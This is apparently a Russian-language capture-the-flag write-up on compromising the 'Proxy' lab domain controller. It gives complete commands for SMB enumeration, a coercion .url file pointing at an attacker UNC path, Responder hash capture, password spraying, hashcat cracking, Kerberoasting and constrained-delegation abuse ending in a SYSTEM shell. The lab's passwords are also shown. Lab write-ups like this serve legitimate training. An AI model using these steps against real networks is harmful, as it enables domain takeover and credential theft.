# Отчёт о прохождении машины Proxy

## 1. Разведка (Reconnaissance) — Nmap сканирование

Первым шагом было сканирование целевой машины для выявления открытых портов и определения сервисов.

Выполнен Nmap-скан:

```bash
nmap -sV -sC -p- 10.49.187.41
```

Результаты сканирования показали следующие открытые порты:

| Порт | Сервис | Назначение |
|------|--------|------------|
| 53/tcp | domain (DNS) | DNS-сервер (SERVFAIL в ответах) |
| 88/tcp | kerberos-sec | Kerberos KDC (Key Distribution Center) |
| 135/tcp | msrpc | Microsoft Windows RPC |
| 139/tcp | netbios-ssn | NetBIOS Session Service |
| 389/tcp | ldap | Microsoft Windows Active Directory LDAP (Domain: ctf.local) |
| 445/tcp | microsoft-ds | SMB (Server Message Block) |
| 464/tcp | kpasswd5 | Kerberos password change |
| 593/tcp | ncacn_http | Windows RPC over HTTP |
| 636/tcp | tcpwrapped | LDAPS (предположительно) |
| 3268/tcp | ldap | LDAP Global Catalog |
| 3269/tcp | tcpwrapped | LDAPS Global Catalog |
| 3389/tcp | ms-wbt-server | RDP (Remote Desktop Protocol) |

По наличию портов 88 (Kerberos), 389 (LDAP), 445 (SMB), 464 (kpasswd) и 636 (LDAPS) можно сделать вывод, что целевая машина — **Domain Controller** в домене `ctf.local`.


## 2. SMB — перечисление шаров и находка документов

Используя анонимный доступ к SMB, была выполнена попытка перечисления доступных сетевых папок.

```bash
smbclient -L //10.49.187.41 -N
```

Была обнаружена шара `IT-Shared`, доступная без пароля. Подключаюсь к ней:

```bash
smbclient //10.49.187.41/IT-Shared -N
```

Внутри находились следующие файлы:

```
IT-Credentials-Backup.txt           A      406
IT-Onboarding-Checklist.txt         A      676
IT-Portal.html                      A     4887
```

Содержимое этих файлов было проанализировано.

**IT-Credentials-Backup.txt** содержал учётные данные:

```
helpdesk.bob  :  Welcome123!    [DISABLED - left company 2021]
it.admin      :  ITAdmin2019!   [DISABLED - role change 2022]
```

**IT-Onboarding-Checklist.txt** содержал важную информацию о сервисе-сканере:

```
File Scanner (svc.scanner)
    Runs every 2 minutes. Enumerates IT-Shared for new files to process.
    Uses Shell enumeration to inspect file metadata and icons.
```

Из этого стало понятно, что существует сервисная учётная запись `svc.scanner`, которая каждые 2 минуты сканирует папку `IT-Shared`.

**IT-Portal.html** — веб-дашборд с событиями, где в правом верхнем углу указано `Logged in as: svc.scanner`. В тикетах упоминаются пользователи `j.smith`, `m.jones`, `svc.helpdesk`.


## 3. LDAP — определение домена и контроллера

Выполнена базовая LDAP-проверка:

```bash
ldapsearch -x -H ldap://10.49.187.41 -s base
```

Получена информация:
- Домен: `ctf.local`
- Контроллер домена: `dc01.ctf.local`

При попытке перечисления пользователей через LDAP:

```bash
ldapsearch -x -H ldap://10.49.187.41 -b "dc=ctf,dc=local" "(objectClass=person)"
```

Получена ошибка: для выполнения операции требуется аутентификация. Анонимный доступ к LDAP запрещён.


## 4. RPC — проверка null session

Попытка подключения через `rpcclient` с пустыми учётными данными:

```bash
rpcclient -U "" -N 10.49.187.41
```

Подключение установлено, но для выполнения команд (например, `enumdomusers`) требовалась аутентификация.


## 5. Kerbrute — перечисление пользователей

Использован `kerbrute` со словарём, составленным из найденных в файлах имён пользователей:

```
helpdesk.bob
it.admin
j.smith
m.jones
svc.scanner
svc.mssql
svc.helpdesk
Administrator
```

```bash
kerbrute userenum --dc 10.49.187.41 -d ctf.local users.txt
```

Результат: **0 валидных пользователей** — словарь не содержал существующих имён или kerbrute не смог их определить.


## 6. File-based coercion — попытка атаки через Responder

Основываясь на информации о сервисе `svc.scanner` (сканирует IT-Shared каждые 2 минуты, использует Shell enumeration), было решено провести **file-based coercion attack** через `.url` файл.

Создан файл `@Shortcut.url`:

```bash
cat > @Shortcut.url << 'EOF'
[InternetShortcut]
URL=http://thm.loc
WorkingDirectory=thm
IconFile=\\IP_ATTACKER\icons\icon.ico
IconIndex=1
EOF
```

Загружен на шару:

```bash
smbclient //10.49.187.41/IT-Shared -N
put @Shortcut.url
```

Запущен Responder для перехвата NTLMv2 хэша:

```bash
sudo responder -I ens5
```

**Результат:** хэш не пришёл. Атака не сработала (возможно, из-за проверки существования файла по UNC пути).


## 7. Password spraying — проверка найденных паролей

Выполнен password spraying с найденными паролями (`Welcome123!`, `ITAdmin2019!`) по всем известным пользователям:

```bash
nxc smb 10.49.187.41 -u users.txt -p 'Welcome123!' --continue-on-success
nxc smb 10.49.187.41 -u users.txt -p 'ITAdmin2019!' --continue-on-success
```

Результаты:

- `Welcome123!` подошёл для `helpdesk.bob`, `m.jones`, `j.smith` — но все с пометкой `(Guest)`, то есть учётные записи отключены.
- `ITAdmin2019!` подошёл для `m.jones`, `j.smith`, `it.admin` — также с пометкой `(Guest)`.

Активных учётных записей найдено не было.


## 8. AS-REP Roasting — проверка предварительной аутентификации

Проверка пользователей на отключённую предварительную аутентификацию:

```bash
GetNPUsers.py ctf.local/ -dc-ip 10.49.187.41 -usersfile users.txt -format hashcat -outputfile asrep.txt
```

Результаты:
- `helpdesk.bob`: `KDC_ERR_CLIENT_REVOKED` (учётка отключена)
- `it.admin`: `KDC_ERR_CLIENT_REVOKED` (учётка отключена)
- `svc.scanner`: `doesn't have UF_DONT_REQUIRE_PREAUTH set`
- `svc.mssql`: `doesn't have UF_DONT_REQUIRE_PREAUTH set`
- `Administrator`: `doesn't have UF_DONT_REQUIRE_PREAUTH set`

AS-REP Roasting не сработал — ни у кого не отключена pre-authentication.


## 9. RDP — проверка доступа

Попытка подключения по RDP с найденными учётными данными:

```bash
nxc rdp 10.49.187.41 -u svc.scanner -p '1summerlove!'
```

Результат: подключение не удалось.


## 10. enum4linux — подтверждение null session

Запущен enum4linux для сбора информации:

```bash
enum4linux -a 10.49.187.41
```

Подтверждена возможность анонимного подключения (null session). Перечисление пользователей через `enumdomusers` завершилось ошибкой `NT_STATUS_ACCESS_DENIED`.

Попытка RID-cycling через rpcclient:

```bash
for i in $(seq 500 2000); do rpcclient -U "" -N 10.49.187.41 -c "queryuser $i" 2>/dev/null | grep -i "User Name" | cut -d: -f2 | tr -d ' '; done
```

Команда выполнялась очень долго, результатов не дала.


## 11. File-based coercion — успешное получение NTLMv2 хэша

Спустя некоторое время атака через `.url` файл всё же сработала. Responder перехватил NTLMv2 хэш пользователя `svc.scanner`.


## 12. Взлом NTLMv2 хэша

Полученный хэш был взломан с помощью Hashcat (режим 5600 для NetNTLMv2):

```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force
```

Пароль: **`1summerlove!`**


## 13. Проверка учётной записи `svc.scanner`

Аутентификация с найденным паролем:

```bash
nxc smb 10.49.187.41 -u 'svc.scanner' -p '1summerlove!'
```

Результат:

```
SMB 10.49.187.41 445 DC01 [+] ctf.local\svc.scanner:1summerlove! (Guest)
```

Учётная запись отмечена как `(Guest)`, то есть имеет ограниченные права.

---

## 14. Password spraying с новым паролем

Выполнен password spraying с паролем `1summerlove!` по всем известным пользователям:

```bash
nxc smb 10.49.187.41 -u users.txt -p '1summerlove!' --continue-on-success
```

Результат: только `svc.scanner` аутентифицировался. Остальные — нет.


## 15. Kerberoasting — получение TGS-билетов

Запущен Kerberoasting для получения TGS-билетов сервисных учётных записей:

```bash
GetUserSPNs.py ctf.local/svc.scanner:'1summerlove!'@10.49.187.41 -request -outputfile kerberoast.txt
```

Получены TGS-билеты для:
- `svc.scanner` (SPN: scanner/DC01, scanner/DC01.ctf.local)
- `svc.mssql` (SPN: MSSQLSvc/DC01:1433, MSSQLSvc/DC01.ctf.local:1433)

Попытка взлома TGS-билета `svc.mssql` через Hashcat (режим 13100):

```bash
hashcat -m 13100 tgs_mssql.hash /usr/share/wordlists/rockyou.txt --force
```

**Неудача** — пароль не был найден в словаре.


## 16. Попытки удалённого выполнения команд

Проверены различные методы удалённого выполнения команд с учётной записью `svc.scanner`:

```bash
nxc smb 10.49.187.41 -u 'svc.scanner' -p '1summerlove!' -x 'whoami'
nxc wmi 10.49.187.41 -u 'svc.scanner' -p '1summerlove!' -x 'whoami'
```

**Результат:** ни один метод не сработал — учётная запись не имеет прав на удалённое выполнение команд.


## 17. Доступ к SYSVOL через smbclient

Подключение к SYSVOL — важной директории для хранения групповых политик:

```bash
smbclient //10.49.187.41/SYSVOL -U ctf.local/svc.scanner%1summerlove!
```

Удалось получить доступ к папкам `Policies` и `scripts`, но файлов с паролями (`Groups.xml`) обнаружено не было.


## 18. BloodHound — сбор данных и анализ

Запущен сбор данных через `bloodhound-python`:

```bash
bloodhound-python -u svc.scanner -p '1summerlove!' -d ctf.local -ns 10.49.187.41 -c ALL --zip
```

После загрузки архива в BloodHound были проанализированы права учётной записи `svc.scanner`.

В графе BloodHound обнаружено, что `svc.scanner` имеет право **AllowedToDelegate** на:

```
cifs/DC01
cifs/DC01.ctf.local
```

Это означает, что учётная запись может использовать **Kerberos Constrained Delegation** для доступа к SMB-службе на контроллере домена от имени любого пользователя.


## 19. Kerberos Constrained Delegation — атака

Имея пароль `svc.scanner` и зная о праве `AllowedToDelegate`, была проведена атака Constrained Delegation для получения доступа к DC от имени `Administrator`.

### Шаг 1 — получение TGT для `svc.scanner`

```bash
getTGT.py ctf.local/svc.scanner:'1summerlove!' -dc-ip 10.49.187.41
```

Файл `svc.scanner.ccache` создан.

### Шаг 2 — экспорт билета

```bash
export KRB5CCNAME=svc.scanner.ccache
```

### Шаг 3 — подделка билета для `Administrator` на CIFS DC

```bash
getST.py -spn 'cifs/DC01.ctf.local' -impersonate 'Administrator' ctf.local/svc.scanner -dc-ip 10.49.187.41
```

Файл `Administrator.ccache` создан.

### Шаг 4 — экспорт нового билета

```bash
export KRB5CCNAME=Administrator.ccache
```

### Шаг 5 — получение shell на DC

```bash
psexec.py -k -no-pass ctf.local/Administrator@DC01.ctf.local
```

**Успех!** Получен shell от имени `NT AUTHORITY\SYSTEM` на контроллере домена.


## 20. Флаг

В shell на DC найден флаг в домашней папке `Administrator`:

```cmd
C:\Users\Administrator\Desktop> type flag.txt
THM{...}
```


## 21. Итог

Цепочка атаки включала:

1. SMB (IT-Shared) → нахождение документов с информацией о `svc.scanner`
2. File-based coercion (`.url` + Responder) → получение NTLMv2 хэша
3. Взлом хэша → пароль `1summerlove!`
4. Kerberoasting → получение TGS-билетов
5. BloodHound → обнаружение права `AllowedToDelegate` у `svc.scanner`
6. Kerberos Constrained Delegation → подделка билета для `Administrator`
7. Получение shell на DC и флага


## 22. Достижения и новые навыки

В ходе прохождения машины Proxy были впервые применены следующие техники и инструменты:

**Kerberos Constrained Delegation** — впервые использована атака на основе делегирования Kerberos. Изучено значение атрибута `msDS-AllowedToDelegateTo` и edge `AllowedToDelegate` в BloodHound. Освоен процесс получения TGT для учётной записи с правом делегирования, подделки TGS для целевого сервиса (`cifs/DC01`) и использования поддельного билета для доступа к контроллеру домена через `psexec.py -k`.

**File-based coercion через `.url` файл** — отработана техника принудительной аутентификации через иконки. Создан `.url` файл с UNC-путем к атакующей машине, загружен в сканируемую папку, получен NTLMv2 хэш.

**BloodHound** — впервые проведён полный анализ прав `AllowedToDelegate`. Найден путь эскалации через делегирование.

**NXC (NetExec)** — активно использовался для проверки аутентификации, перебора паролей, загрузки файлов (SharpHound) и удалённого выполнения команд. Освоены флаги `--shares`, `--users`, `--pass-pol`, `--groups`.

**Kerberoasting** — отработана техника получения TGS-билетов для сервисных учётных записей, в том числе для `svc.mssql` (хотя взломать пароль не удалось).

**SMB-шары** — исследованы шары `IT-Shared` и `SYSVOL`, проведён поиск конфигурационных файлов (`Groups.xml`, `Registry.pol`, скриптов).

**LDAP** — выполнена базовая разведка домена через `ldapsearch` (хотя анонимный доступ был ограничен).

**RID-cycling** — попытка перебора RID через `rpcclient` для перечисления пользователей (без результата из-за ограничений).